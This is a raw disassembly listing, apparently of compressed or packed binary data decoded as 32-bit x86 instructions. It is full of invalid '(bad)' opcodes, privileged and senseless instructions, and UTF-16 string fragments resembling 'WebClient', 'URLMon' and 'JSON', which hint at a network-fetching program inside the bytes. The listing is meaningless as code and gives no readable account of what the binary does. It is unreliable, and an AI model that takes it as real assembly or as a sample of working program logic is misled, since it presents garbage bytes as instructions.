  4040a4:	02 79 2d             	add    0x2d(%ecx),%bh
  4040a7:	3d 30 04 aa 37       	cmp    $0x37aa0430,%eax
  4040ac:	f0 3d 65 50 bb 32    	lock cmp $0x32bb5065,%eax
  4040b2:	d0 03                	rolb   $1,(%ebx)
  4040b4:	34 70                	xor    $0x70,%al
  4040b6:	00 56 39             	add    %dl,0x39(%esi)
  4040b9:	f0 00 31             	lock add %dh,(%ecx)
  4040bc:	00 62 70             	add    %ah,0x70(%edx)
  4040bf:	17                   	pop    %ss
  4040c0:	31 30                	xor    %esi,(%eax)
  4040c2:	01 30                	add    %esi,(%eax)
  4040c4:	45                   	inc    %ebp
  4040c5:	30 02                	xor    %al,(%edx)
  4040c7:	62 30                	bound  %esi,(%eax)
  4040c9:	00 38                	add    %bh,(%eax)
  4040cb:	00 36                	add    %dh,(%esi)
  4040cd:	d0 e7                	shl    $1,%bh
  4040cf:	33 75 10             	xor    0x10(%ebp),%esi
  4040d2:	01 62 10             	add    %esp,0x10(%edx)
  4040d5:	02 5d df             	add    -0x21(%ebp),%bl
  4040d8:	80 70 43 ff          	xorb   $0xff,0x43(%eax)
  4040dc:	98                   	cwtl
  4040dd:	31 ff                	xor    %edi,%edi
  4040df:	30 08                	xor    %cl,(%eax)
  4040e1:	51                   	push   %ecx
  4040e2:	ea d3 30 df 25 31 19 	ljmp   $0x1931,$0x25df30d3
  4040e9:	5f                   	pop    %edi
  4040ea:	01 df                	add    %ebx,%edi
  4040ec:	1c df                	sbb    $0xdf,%al
  4040ee:	1c b5                	sbb    $0xb5,%al
  4040f0:	d3 1c 61             	rcrl   %cl,(%ecx,%eiz,2)
  4040f3:	f0 0e                	lock push %cs
  4040f5:	6b 50 e4 f1          	imul   $0xfffffff1,-0x1c(%eax),%edx
  4040f9:	ce                   	into
  4040fa:	75 92                	jne    0x40408e
  4040fc:	73 5a                	jae    0x404158
  4040fe:	20 30                	and    %dh,(%eax)
  404100:	16                   	push   %ss
  404101:	68 12 14 b1 ef       	push   $0xefb11412
  404106:	20 b0 13 74 f5 10    	and    %dh,0x10f57413(%eax)
  40410c:	28 72 50             	sub    %dh,0x50(%edx)
  40410f:	01 65 b0             	add    %esp,-0x50(%ebp)
  404112:	0b 3f                	or     (%edi),%edi
  404114:	28 3f                	sub    %bh,(%edi)
  404116:	28 3f                	sub    %bh,(%edi)
  404118:	28 fd                	sub    %bh,%ch
  40411a:	3f                   	aas
  40411b:	28 20                	sub    %ah,(%eax)
  40411d:	90                   	nop
  40411e:	2e 3f                	cs aas
  404120:	28 75 32             	sub    %dh,0x32(%ebp)
  404123:	9f                   	lahf
  404124:	32 99 32 3d 26 2b    	xor    0x2b263d32(%ecx),%bl
  40412a:	91                   	xchg   %eax,%ecx
  40412b:	b4 b1                	mov    $0xb1,%ah
  40412d:	da 65 d0             	fisubl -0x30(%ebp)
  404130:	1f                   	pop    %ds
  404131:	70 70                	jo     0x4041a3
  404133:	0a 20                	or     (%eax),%ah
  404135:	00 00                	add    %al,(%eax)
  404137:	23 00                	and    (%eax),%eax
  404139:	9b                   	fwait
  40413a:	b6 00                	mov    $0x0,%dh
  40413c:	31 00                	xor    %eax,(%eax)
  40413e:	20 00                	and    %al,(%eax)
  404140:	28 00                	sub    %al,(%eax)
  404142:	6d                   	insl   (%dx),%es:(%edi)
  404143:	00 08                	add    %cl,(%eax)
  404145:	61                   	popa
  404146:	00 78 00             	add    %bh,0x0(%eax)
  404149:	90                   	nop
  40414a:	30 00                	xor    %al,(%eax)
  40414c:	29 00                	sub    %eax,(%eax)
  40414e:	00 0d 00 0a 00 30    	add    %cl,0x30000a00
  404154:	00 37                	add    %dh,(%edi)
  404156:	00 58 2f             	add    %bl,0x2f(%eax)
  404159:	00 32                	add    %dh,(%edx)
  40415b:	00 08                	add    %cl,(%eax)
  40415d:	01 28                	add    %ebp,(%eax)
  40415f:	30 00                	xor    %al,(%eax)
  404161:	1c 34                	sbb    $0x34,%al
  404163:	15 00 74 31 00       	adc    $0x317400,%eax
  404168:	54                   	push   %esp
  404169:	3a 00                	cmp    (%eax),%al
  40416b:	6c                   	insb   (%dx),%es:(%edi)
  40416c:	33 00                	xor    (%eax),%eax
  40416e:	3a 04 00             	cmp    (%eax,%eax,1),%al
  404171:	31 00                	xor    %eax,(%eax)
  404173:	4c                   	dec    %esp
  404174:	2e 00 34 00          	add    %dh,%cs:(%eax,%eax,1)
  404178:	33 04 00             	xor    (%eax,%eax,1),%eax
  40417b:	38 00                	cmp    %al,(%eax)
  40417d:	32 57 00             	xor    0x0(%edi),%dl
  404180:	65 00 62 40          	add    %ah,%gs:0x40(%edx)
  404184:	00 43 00             	add    %al,0x0(%ebx)
  404187:	6c                   	insb   (%dx),%es:(%edi)
  404188:	00 69 00             	add    %ch,0x0(%ecx)
  40418b:	12 6e a4             	adc    -0x5c(%esi),%ch
  40418e:	00 74 00 42          	add    %dh,0x42(%eax,%eax,1)
  404192:	20 00                	and    %al,(%eax)
  404194:	0f 2a 28             	cvtpi2ps (%eax),%xmm5
  404197:	00 7a 06             	add    %bh,0x6(%edx)
  40419a:	30 04 06             	xor    %al,(%esi,%eax,1)
  40419d:	01 9a 43 00 44 00    	add    %ebx,0x440043(%edx)
  4041a3:	46                   	inc    %esi
  4041a4:	d0 00                	rolb   $1,(%eax)
  4041a6:	35 00 42 00 47       	xor    $0x47004200,%eax
  4041ab:	36 00 3f             	add    %bh,%ss:(%edi)
  4041ae:	01 7f aa             	add    %edi,-0x56(%edi)
  4041b1:	3a 00                	cmp    (%eax),%al
  4041b3:	4f                   	dec    %edi
  4041b4:	42                   	inc    %edx
  4041b5:	00 45 67             	add    %al,0x67(%ebp)
  4041b8:	00 4b 6e             	add    %cl,0x6e(%ebx)
  4041bb:	00 1f                	add    %bl,(%edi)
  4041bd:	a0 6f 00 77 00       	mov    0x77006f,%al
  4041c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4041c3:	00 59 6f             	add    %bl,0x6f(%ecx)
  4041c6:	00 a3 28 64 00 41    	add    %ah,0x41006428(%ebx)
  4041cc:	00 5b 74             	add    %bl,0x74(%ebx)
  4041cf:	00 1d 6d 00 a2 70    	add    %bl,0x70a2006d
  4041d5:	04 65                	add    $0x65,%al
  4041d7:	75 00                	jne    0x4041d9
  4041d9:	73 02                	jae    0x4041dd
  4041db:	29 67 00             	sub    %esp,0x0(%edi)
  4041de:	37                   	aaa
  4041df:	00 55 00             	add    %dl,0x0(%ebp)
  4041e2:	52                   	push   %edx
  4041e3:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  4041e7:	00 c6                	add    %al,%dh
  4041e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ea:	00 31                	add    %dh,(%ecx)
  4041ec:	2b c7                	sub    %edi,%eax
  4041ee:	34 00                	xor    $0x0,%al
  4041f0:	39 80 1f bb 63 e8    	cmp    %eax,-0x179c44e1(%eax)
  4041f6:	39 00                	cmp    %eax,(%eax)
  4041f8:	36 80 6d 39 80       	subb   $0x80,%ss:0x39(%ebp)
  4041fd:	88 85 63 81 4d aa    	mov    %al,-0x55b27e9d(%ebp)
  404203:	65 80 83 69 80 47 48 	addb   $0x82,%gs:0x48478069(%ebx)
  40420a:	82 
  40420b:	5c                   	pop    %esp
  40420c:	70 82                	jo     0x404190
  40420e:	8c 60 74             	mov    %fs,0x74(%eax)
  404211:	00 72 00             	add    %dh,0x0(%edx)
  404214:	75 80                	jne    0x404196
  404216:	62 ff 51             	(bad)
  404219:	20 a9 c0 5e 65 00    	and    %ch,0x655ec0(%ecx)
  40421f:	c3                   	ret
  404220:	5a                   	pop    %edx
  404221:	6e                   	outsb  %ds:(%esi),(%dx)
  404222:	c6                   	(bad)
  404223:	51                   	push   %ecx
  404224:	41                   	inc    %ecx
  404225:	c0 54 6a 79 c0       	rclb   $0xc0,0x79(%edx,%ebp,2)
  40422a:	2c 63                	sub    $0x63,%al
  40422c:	c0 44 44 40 53       	rolb   $0x53,0x40(%esp,%eax,2)
  404231:	49                   	dec    %ecx
  404232:	60                   	pusha
  404233:	2c 01                	sub    $0x1,%al
  404235:	c0 04 69 00          	rolb   $0x0,(%ecx,%ebp,2)
  404239:	64 00 3d 00 5b b4 00 	add    %bh,%fs:0xb45b00
  404240:	45                   	inc    %ebp
  404241:	c0 6c 53 c0 00       	shrb   $0x0,-0x40(%ebx,%edx,2)
  404246:	c1 5b 66 40          	rcrl   $0x40,0x66(%ebx)
  40424a:	0f 00 67 00          	verr   0x0(%edi)
  40424e:	4a                   	dec    %edx
  40424f:	00 53 00             	add    %dl,0x0(%ebx)
  404252:	4f                   	dec    %edi
  404253:	00 50 4e             	add    %dl,0x4e(%eax)
  404256:	00 5d 00             	add    %bl,0x0(%ebp)
  404259:	c1 09 68             	rorl   $0x68,(%ecx)
  40425c:	c2 04 68             	ret    $0x6804
  40425f:	74 00                	je     0x404261
  404261:	50                   	push   %eax
  404262:	c0 3b 69             	sarb   $0x69,(%ebx)
  404265:	42                   	inc    %edx
  404266:	0c 45                	or     $0x45,%al
  404268:	3e c3                	ds ret
  40426a:	07                   	pop    %es
  40426b:	55                   	push   %ebp
  40426c:	55                   	push   %ebp
  40426d:	c6 05 68 44 47 73 c0 	movb   $0xc0,0x73474468
  404274:	47                   	inc    %edi
  404275:	2f                   	das
  404276:	c0 9e 65 94 00 63 c0 	rcrb   $0xc0,0x63009465(%esi)
  40427d:	20 2e                	and    %ch,(%esi)
  40427f:	c0 1e 66             	rcrb   $0x66,(%esi)
  404282:	00 41 16             	add    %al,0x16(%ecx)
  404285:	aa                   	stos   %al,%es:(%edi)
  404286:	63 40 4b             	arpl   %eax,0x4b(%eax)
  404289:	2e c0 04 6f c0       	rolb   $0xc0,%cs:(%edi,%ebp,2)
  40428e:	aa                   	stos   %al,%es:(%edi)
  40428f:	2f                   	das
  404290:	c2 01 aa             	ret    $0xaa01
  404293:	6e                   	outsb  %ds:(%esi),(%dx)
  404294:	c2 05 67             	ret    $0x6705
  404297:	c0 0a 76             	rorb   $0x76,(%edx)
  40429a:	40                   	inc    %eax
  40429b:	a3 2f 40 1d 62       	mov    %eax,0x621d402f
  4042a0:	44                   	inc    %esp
  4042a1:	c0 1e 50             	rcrb   $0x50,(%esi)
  4042a4:	00 5f 40             	add    %bl,0x40(%edi)
  4042a7:	01 c3                	add    %eax,%ebx
  4042a9:	2e 5f                	cs pop %edi
  4042ab:	47                   	inc    %edi
  4042ac:	40                   	inc    %eax
  4042ad:	26 47                	es inc %edi
  4042af:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4042b0:	41                   	inc    %ecx
  4042b1:	b2 34                	mov    $0x34,%dl
  4042b3:	00 2e                	add    %ch,(%esi)
  4042b5:	42                   	inc    %edx
  4042b6:	ae                   	scas   %es:(%edi),%al
  4042b7:	36 55                	ss push %ebp
  4042b9:	c0 01 30             	rolb   $0x30,(%ecx)
  4042bc:	40                   	inc    %eax
  4042bd:	6b 32 c0             	imul   $0xffffffc0,(%edx),%esi
  4042c0:	9d                   	popf
  4042c1:	2e c6                	cs (bad)
  4042c3:	a3 3f b4 00 55       	mov    %eax,0x5500b43f
  4042c8:	40                   	inc    %eax
  4042c9:	95                   	xchg   %eax,%ebp
  4042ca:	64 c0 99 41 98 52 c0 	rcrb   $0x2e,%fs:-0x3fad67bf(%ecx)
  4042d1:	2e 
  4042d2:	aa                   	stos   %al,%es:(%edi)
  4042d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4042d4:	40                   	inc    %eax
  4042d5:	46                   	inc    %esi
  4042d6:	3d 42 2f 6f 40       	cmp    $0x406f2f42,%eax
  4042db:	3c 26                	cmp    $0x26,%al
  4042dd:	c0 18 5a             	rcrb   $0x5a,(%eax)
  4042e0:	53                   	push   %ebx
  4042e1:	40                   	inc    %eax
  4042e2:	31 57 42             	xor    %edx,0x42(%edi)
  4042e5:	06                   	push   %es
  4042e6:	43                   	inc    %ebx
  4042e7:	03 56 c0             	add    -0x40(%esi),%edx
  4042ea:	25 72 ad c0 04       	and    $0x4c0ad72,%eax
  4042ef:	31 40 11             	xor    %eax,0x11(%eax)
  4042f2:	41                   	inc    %ecx
  4042f3:	12 2e                	adc    (%esi),%ch
  4042f5:	c0 c5 32             	rol    $0x32,%ch
  4042f8:	40                   	inc    %eax
  4042f9:	16                   	push   %ss
  4042fa:	46                   	inc    %esi
  4042fb:	33 c0                	xor    %eax,%eax
  4042fd:	19 43 08             	sbb    %eax,0x8(%ebx)
  404300:	53                   	push   %ebx
  404301:	00 6b c0             	add    %ch,-0x40(%ebx)
  404304:	7a 3d                	jp     0x404343
  404306:	51                   	push   %ecx
  404307:	c0 ca 38             	ror    $0x38,%dl
  40430a:	00 26                	add    %ah,(%esi)
  40430c:	c0 16 63             	rclb   $0x63,(%esi)
  40430f:	42                   	inc    %edx
  404310:	2f                   	das
  404311:	75 41                	jne    0x404354
  404313:	40                   	inc    %eax
  404314:	57                   	push   %edi
  404315:	74 00                	je     0x404317
  404317:	54                   	push   %esp
  404318:	00 79 40             	add    %bh,0x40(%ecx)
  40431b:	1c 65                	sbb    $0x65,%al
  40431d:	ad                   	lods   %ds:(%esi),%eax
  40431e:	c0 0f 42             	rorb   $0x42,(%edi)
  404321:	c0 08 c3             	rorb   $0xc3,(%eax)
  404324:	b1 65                	mov    $0x65,%cl
  404326:	c0 3d 73 40 0a 56 63 	sarb   $0x63,0x560a4073
  40432d:	48                   	dec    %eax
  40432e:	d3 c3                	rol    %cl,%ebx
  404330:	5b                   	pop    %ebx
  404331:	37                   	aaa
  404332:	40                   	inc    %eax
  404333:	3c 39                	cmp    $0x39,%al
  404335:	40                   	inc    %eax
  404336:	2c 32                	sub    $0x32,%al
  404338:	55                   	push   %ebp
  404339:	40                   	inc    %eax
  40433a:	cc                   	int3
  40433b:	38 40 12             	cmp    %al,0x12(%eax)
  40433e:	2d c0 ac 38 c0       	sub    $0xc038acc0,%eax
  404343:	1d 38 ac 00 2d       	sbb    $0x2d00ac38,%eax
  404348:	40                   	inc    %eax
  404349:	04 c1                	add    $0xc1,%al
  40434b:	e2 64                	loop   0x4043b1
  40434d:	40                   	inc    %eax
  40434e:	02 66 40             	add    0x40(%esi),%ah
  404351:	1f                   	pop    %ds
  404352:	55                   	push   %ebp
  404353:	c1 30 2d             	shll   $0x2d,(%eax)
  404356:	42                   	inc    %edx
  404357:	e7 35                	out    %eax,$0x35
  404359:	40                   	inc    %eax
  40435a:	a3 65 c0 2e 35       	mov    %eax,0x352ec065
  40435f:	d5 c0                	aad    $0xc0
  404361:	00 38                	add    %bh,(%eax)
  404363:	c0 e8 32             	shr    $0x32,%al
  404366:	c0 0c 5d ec f8 7f 63 	rorb   $0x57,0x637ff8ec(,%ebx,2)
  40436d:	57 
  40436e:	29 7f 73             	sub    %edi,0x73(%edi)
  404371:	7c 6f                	jl     0x4043e2
  404373:	63 42 62             	arpl   %eax,0x62(%edx)
  404376:	21 6b 20             	and    %ebp,0x20(%ebx)
  404379:	2c 72                	sub    $0x72,%al
  40437b:	8b a0 3c e1 21 64    	mov    0x6421e13c(%eax),%esp
  404381:	20 4b 74             	and    %cl,0x74(%ebx)
  404384:	00 68 60             	add    %ch,0x60(%eax)
  404387:	42                   	inc    %edx
  404388:	d6                   	salc
  404389:	65 60                	gs pusha
  40438b:	03 a1 01 73 a0 42    	add    0x42a07301(%ecx),%esp
  404391:	61                   	popa
  404392:	e0 01                	loopne 0x404395
  404394:	e1 31                	loope  0x4043c7
  404396:	fe                   	(bad)
  404397:	64 bf 16 60 23 27    	fs mov $0x27236016,%edi
  40439d:	93                   	xchg   %eax,%ebx
  40439e:	bf 16 bf 16 af       	mov    $0xaf16bf16,%edi
  4043a3:	16                   	push   %ss
  4043a4:	ad                   	lods   %ds:(%esi),%eax
  4043a5:	61                   	popa
  4043a6:	6a 20                	push   $0x20
  4043a8:	20 15 74 a0 14 65    	and    %dl,0x6514a074
  4043ae:	e0 52                	loopne 0x404402
  4043b0:	21 92 20 fc 00 23    	and    %edx,0x2300fc20(%edx)
  4043b6:	20 3f                	and    %bh,(%edi)
  4043b8:	7f aa                	jg     0x404364
  4043ba:	79 aa                	jns    0x404366
  4043bc:	3f                   	aas
  4043bd:	17                   	pop    %ss
  4043be:	3f                   	aas
  4043bf:	17                   	pop    %ss
  4043c0:	f1                   	int1
  4043c1:	2d ff e5 7c 6d       	sub    $0x6d7ce5ff,%eax
  4043c6:	18 7f aa             	sbb    %bh,-0x56(%edi)
  4043c9:	7f aa                	jg     0x404375
  4043cb:	71 c3                	jno    0x404390
  4043cd:	ff 18                	lcall  *(%eax)
  4043cf:	ff 18                	lcall  *(%eax)
  4043d1:	ff 18                	lcall  *(%eax)
  4043d3:	af                   	scas   %es:(%edi),%eax
  4043d4:	7f c3                	jg     0x404399
  4043d6:	a1 78 a1 d1 a3       	mov    0xa3d1a178,%eax
  4043db:	b0 54                	mov    $0x54,%al
  4043dd:	a0 6e 50 62 98       	mov    0x9862506e,%al
  4043e2:	56                   	push   %esi
  4043e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4043e4:	20 6d 21             	and    %ch,0x21(%ebp)
  4043e7:	4b                   	dec    %ebx
  4043e8:	61                   	popa
  4043e9:	60                   	pusha
  4043ea:	63 20                	arpl   %esp,(%eax)
  4043ec:	22 8d 20 ab 20 80    	and    -0x7fdf54e0(%ebp),%cl
  4043f2:	3f                   	aas
  4043f3:	c8 20 20 3c          	enter  $0x2020,$0x3c
  4043f7:	37                   	aaa
  4043f8:	e0 94                	loopne 0x40438e
  4043fa:	30 ff                	xor    %bh,%bh
  4043fc:	4d                   	dec    %ebp
  4043fd:	bf 20 43 e1 d9       	mov    $0xd9e14320,%edi
  404402:	3f                   	aas
  404403:	e1 23                	loope  0x404428
  404405:	e1 af                	loope  0x4043b6
  404407:	1d 6d 35 54 e0       	sbb    $0xe054356d,%eax
  40440c:	14 8a                	adc    $0x8a,%al
  40440e:	53                   	push   %ebx
  40440f:	a0 0a 72 e0 8e       	mov    0x8ee0720a,%al
  404414:	61                   	popa
  404415:	00 6d a0             	add    %ch,-0x60(%ebp)
  404418:	10 ab 27 1b e1 50    	adc    %ch,0x50e11b27(%ebx)
  40441e:	70 60                	jo     0x404480
  404420:	9e                   	sahf
  404421:	72 60                	jb     0x404483
  404423:	52                   	push   %edx
  404424:	63 a0 8e ad a1 ab    	arpl   %esp,-0x545e5272(%eax)
  40442a:	6c                   	insb   (%dx),%es:(%edi)
  40442b:	20 1d 61 05 74 e0    	and    %bl,0xe0740561
  404431:	8b 72 60             	mov    0x60(%edx),%esi
  404434:	8e d5                	mov    %ebp,%ss
  404436:	61                   	popa
  404437:	81 20 62 6c 3d 20    	andl   $0x203d6c62,(%eax)
  40443d:	87 78 60             	xchg   %edi,0x60(%eax)
  404440:	00 f5                	add    %dh,%ch
  404442:	78 ed                	js     0x404431
  404444:	73 00                	jae    0x404446
  404446:	2e 5f                	cs pop %edi
  404448:	36 30 02             	xor    %al,%ss:(%edx)
  40444b:	32 b0 44 5f 0f f1    	xor    -0xef0a0bc(%eax),%dh
  404451:	7f f6                	jg     0x404449
  404453:	35 d0 01 11 08       	xor    $0x81101d0,%eax
  404458:	65 ff                	gs (bad)
  40445a:	7f ff                	jg     0x40445b
  40445c:	7f 90                	jg     0x4043ee
  40445e:	86 d7                	xchg   %dl,%bh
  404460:	06                   	push   %es
  404461:	f7 f7                	div    %edi
  404463:	7f 5f                	jg     0x4044c4
  404465:	0f 5f 0f             	maxps  (%edi),%xmm1
  404468:	6f                   	outsl  %ds:(%esi),(%dx)
  404469:	50                   	push   %eax
  40446a:	5d                   	pop    %ebp
  40446b:	b1 63                	mov    $0x63,%cl
  40446d:	91                   	xchg   %eax,%ecx
  40446e:	41                   	inc    %ecx
  40446f:	5f                   	pop    %edi
  404470:	0f ea 70 90          	pminsw -0x70(%eax),%mm6
  404474:	59                   	pop    %ecx
  404475:	70 10                	jo     0x404487
  404477:	11 6e df             	adc    %ebp,-0x21(%esi)
  40447a:	0e                   	push   %cs
  40447b:	10 01                	adc    %al,(%ecx)
  40447d:	11 45 f7             	adc    %eax,-0x9(%ebp)
  404480:	df 0e                	fisttps (%esi)
  404482:	91                   	xchg   %eax,%ecx
  404483:	08 df                	or     %bl,%bh
  404485:	0e                   	push   %cs
  404486:	32 df                	xor    %bh,%bl
  404488:	0e                   	push   %cs
  404489:	30 16                	xor    %dl,(%esi)
  40448b:	d5 8e                	aad    $0x8e
  40448d:	df 0e                	fisttps (%esi)
  40448f:	fe                   	(bad)
  404490:	65 72 5c             	gs jb  0x4044ef
  404493:	3f                   	aas
  404494:	1e                   	push   %ds
  404495:	31 90 9f 50 d1 8e    	xor    %edx,-0x712eaf61(%eax)
  40449b:	df 0e                	fisttps (%esi)
  40449d:	df 0e                	fisttps (%esi)
  40449f:	57                   	push   %edi
  4044a0:	df 0e                	fisttps (%esi)
  4044a2:	33 67 35             	xor    0x35(%edi),%esp
  4044a5:	84 43 50             	test   %al,0x50(%ebx)
  4044a8:	20 6e d2             	and    %ch,-0x2e(%esi)
  4044ab:	1c 63                	sbb    $0x63,%al
  4044ad:	bd b0 20 20 12       	mov    $0x122020b0,%ebp
  4044b2:	53                   	push   %ebx
  4044b3:	1f                   	pop    %ds
  4044b4:	1e                   	push   %ds
  4044b5:	3f                   	aas
  4044b6:	0f 3f                	(bad)
  4044b8:	0f 32                	rdmsr
  4044ba:	f0 73 ff             	lock jae 0x4044bc
  4044bd:	3f                   	aas
  4044be:	0f 19 9e 3f 0f 3f 0f 	nopl   0xf3f0f3f(%esi)
  4044c5:	57                   	push   %edi
  4044c6:	76 3f                	jbe    0x404507
  4044c8:	0f 3f                	(bad)
  4044ca:	0f d1 12             	psrlw  (%edx),%mm2
  4044cd:	57                   	push   %edi
  4044ce:	3f                   	aas
  4044cf:	0f 3f                	(bad)
  4044d1:	0f 3b                	(bad)
  4044d3:	0f 4f 92 72 6e 10 9e 	cmovg  -0x61ef918e(%edx),%edx
  4044da:	65 ec                	gs in  (%dx),%al
  4044dc:	00 71 d0             	add    %dh,-0x30(%ecx)
  4044df:	2c 71                	sub    $0x71,%al
  4044e1:	72 74                	jb     0x404557
  4044e3:	ff 1e                	lcall  *(%esi)
  4044e5:	ff 1e                	lcall  *(%esi)
  4044e7:	10 1d af 71 0f bf    	adc    %bl,0xbf0f71af
  4044ed:	0f bf 0f             	movswl (%edi),%ecx
  4044f0:	dd ad 36 10 af 20    	(bad) 0x20af1036(%ebp)
  4044f6:	10 aa aa 53 30 a5    	adc    %ch,-0x5acfac56(%edx)
  4044fc:	61                   	popa
  4044fd:	f0 16                	lock push %ss
  4044ff:	61                   	popa
  404500:	d0 6a 65             	shrb   $1,0x65(%edx)
  404503:	d0 16                	rclb   $1,(%esi)
  404505:	d4 49                	aam    $0x49
  404507:	00 f1                	add    %dh,%cl
  404509:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40450a:	6c                   	insb   (%dx),%es:(%edi)
  40450b:	d2 37                	shlb   %cl,(%edi)
  40450d:	45                   	inc    %ebp
  40450e:	90                   	nop
  40450f:	b3 b1                	mov    $0xb1,%bl
  404511:	27                   	daa
  404512:	eb 91                	jmp    0x4044a5
  404514:	18 d3                	sbb    %dl,%bl
  404516:	35 48 f0 37 73       	xor    $0x7337f048,%eax
  40451b:	30 36                	xor    %dh,(%esi)
  40451d:	35 45 f1 8b 82       	xor    $0x828bf145,%eax
  404522:	6c                   	insb   (%dx),%es:(%edi)
  404523:	d0 29                	shrb   $1,(%ecx)
  404525:	20 00                	and    %al,(%eax)
  404527:	22 00                	and    (%eax),%al
  404529:	25 10 46 1a 73       	and    $0x731a4610,%eax
  40452e:	b0 00                	mov    $0x0,%al
  404530:	72 54                	jb     0x404586
  404532:	85 b5 01 25 00 5c    	test   %esi,0x5c002501(%ebp)
  404538:	41                   	inc    %ecx
  404539:	70 49                	jo     0x404584
  40453b:	6d                   	insl   (%dx),%es:(%edi)
  40453c:	00 59 00             	add    %bl,0x0(%ecx)
  40453f:	7a 50                	jp     0x404591
  404541:	95                   	xchg   %eax,%ebp
  404542:	4f                   	dec    %edi
  404543:	15 10 0e 55 70       	adc    $0x70550e10,%eax
  404548:	af                   	scas   %es:(%edi),%eax
  404549:	41                   	inc    %ecx
  40454a:	b0 7c                	mov    $0x7c,%al
  40454c:	4f                   	dec    %edi
  40454d:	00 56 45             	add    %dl,0x45(%esi)
  404550:	10 06                	adc    %al,(%esi)
  404552:	6a 50                	push   $0x50
  404554:	01 72 00             	add    %esi,0x0(%edx)
  404557:	4b                   	dec    %ebx
  404558:	30 02                	xor    %al,(%edx)
  40455a:	63 50 00             	arpl   %edx,0x0(%eax)
  40455d:	47                   	inc    %edi
  40455e:	00 51 d0             	add    %dl,-0x30(%ecx)
  404561:	02 36                	add    (%esi),%dh
  404563:	50                   	push   %eax
  404564:	01 69 55             	add    %ebp,0x55(%ecx)
  404567:	d0 02                	rolb   $1,(%edx)
  404569:	57                   	push   %edi
  40456a:	10 11                	adc    %dl,(%ecx)
  40456c:	36 10 07             	adc    %al,%ss:(%edi)
  40456f:	4e                   	dec    %esi
  404570:	50                   	push   %eax
  404571:	89 65 15             	mov    %esp,0x15(%ebp)
  404574:	f0 02 43 50          	lock add 0x50(%ebx),%al
  404578:	4d                   	dec    %ebp
  404579:	42                   	inc    %edx
  40457a:	30 03                	xor    %al,(%ebx)
  40457c:	4a                   	dec    %edx
  40457d:	00 6a ad             	add    %ch,-0x53(%edx)
  404580:	90                   	nop
  404581:	0f 7a                	(bad)
  404583:	b0 4d                	mov    $0x4d,%al
  404585:	d1 02                	roll   $1,(%edx)
  404587:	53                   	push   %ebx
  404588:	70 41                	jo     0x4045cb
  40458a:	44                   	inc    %esp
  40458b:	b0 80                	mov    $0x80,%al
  40458d:	aa                   	stos   %al,%es:(%edi)
  40458e:	47                   	inc    %edi
  40458f:	12 b5 58 f0 32 45    	adc    0x4532f058(%ebp),%dh
  404595:	b0 9a                	mov    $0x9a,%al
  404597:	36 d0 00             	rolb   $1,%ss:(%eax)
  40459a:	55                   	push   %ebp
  40459b:	51                   	push   %ecx
  40459c:	4c                   	dec    %esp
  40459d:	4b                   	dec    %ebx
  40459e:	30 0e                	xor    %cl,(%esi)
  4045a0:	4d                   	dec    %ebp
  4045a1:	50                   	push   %eax
  4045a2:	4d                   	dec    %ebp
  4045a3:	41                   	inc    %ecx
  4045a4:	f0 07                	lock pop %es
  4045a6:	51                   	push   %ecx
  4045a7:	b5 70                	mov    $0x70,%ch
  4045a9:	01 74 f2 07          	add    %esi,0x7(%edx,%esi,8)
  4045ad:	34 f0                	xor    $0xf0,%al
  4045af:	86 d1                	xchg   %dl,%cl
  4045b1:	1f                   	pop    %ds
  4045b2:	53                   	push   %ebx
  4045b3:	10 06                	adc    %al,(%esi)
  4045b5:	6a 35                	push   $0x35
  4045b7:	d0 01                	rolb   $1,(%ecx)
  4045b9:	6b d0 b7             	imul   $0xffffffb7,%eax,%edx
  4045bc:	7a 30                	jp     0x4045ee
  4045be:	01 11                	add    %edx,(%ecx)
  4045c0:	79 50                	jns    0x404612
  4045c2:	55                   	push   %ebp
  4045c3:	90                   	nop
  4045c4:	03 59 50             	add    0x50(%ecx),%ebx
  4045c7:	08 71 70             	or     %dh,0x70(%ecx)
  4045ca:	0e                   	push   %cs
  4045cb:	69 30 85 62 b5 b0    	imul   $0xb0b56285,(%eax),%esi
  4045d1:	01 6e 10             	add    %ebp,0x10(%esi)
  4045d4:	09 48 f0             	or     %ecx,-0x10(%eax)
  4045d7:	97                   	xchg   %eax,%edi
  4045d8:	b1 6d                	mov    $0x6d,%cl
  4045da:	39 d0                	cmp    %edx,%eax
  4045dc:	07                   	pop    %es
  4045dd:	8a 4d d0             	mov    -0x30(%ebp),%cl
  4045e0:	08 66 10             	or     %ah,0x10(%esi)
  4045e3:	89 74 00 49          	mov    %esi,0x49(%eax,%eax,1)
  4045e7:	f0 89 aa 5a 10 04 4e 	lock mov %ebp,0x4e04105a(%edx)
  4045ee:	d0 08                	rorb   $1,(%eax)
  4045f0:	63 90 0f 5f 10 0c    	arpl   %edx,0xc105f0f(%eax)
  4045f6:	aa                   	stos   %al,%es:(%edi)
  4045f7:	5a                   	pop    %edx
  4045f8:	b0 0b                	mov    $0xb,%al
  4045fa:	79 70                	jns    0x40466c
  4045fc:	2c 74                	sub    $0x74,%al
  4045fe:	f0 00 33             	lock add %dh,(%ebx)
  404601:	70 15                	jo     0x404618
  404603:	aa                   	stos   %al,%es:(%edi)
  404604:	74 f0                	je     0x4045f6
  404606:	00 4e d0             	add    %cl,-0x30(%esi)
  404609:	bb 47 b0 16 5c       	mov    $0x5c16b047,%ebx
  40460e:	b0 0f                	mov    $0xf,%al
  404610:	56                   	push   %esi
  404611:	58                   	pop    %eax
  404612:	d0 55 b1             	rclb   $1,-0x4f(%ebp)
  404615:	09 58 10             	or     %ebx,0x10(%eax)
  404618:	07                   	pop    %es
  404619:	31 50 06             	xor    %edx,0x6(%eax)
  40461c:	50                   	push   %eax
  40461d:	55                   	push   %ebp
  40461e:	30 0a                	xor    %cl,(%edx)
  404620:	68 70 0b 38 b0       	push   $0xb0380b70
  404625:	00 41 30             	add    %al,0x30(%ecx)
  404628:	00 72 d5             	add    %dh,-0x2b(%edx)
  40462b:	f0 01 32             	lock add %esi,(%edx)
  40462e:	30 05 78 90 4e 69    	xor    %al,0x694e9078
  404634:	92                   	xchg   %eax,%edx
  404635:	0e                   	push   %cs
  404636:	f1                   	int1
  404637:	4f                   	dec    %edi
  404638:	aa                   	stos   %al,%es:(%edi)
  404639:	50                   	push   %eax
  40463a:	70 48                	jo     0x404684
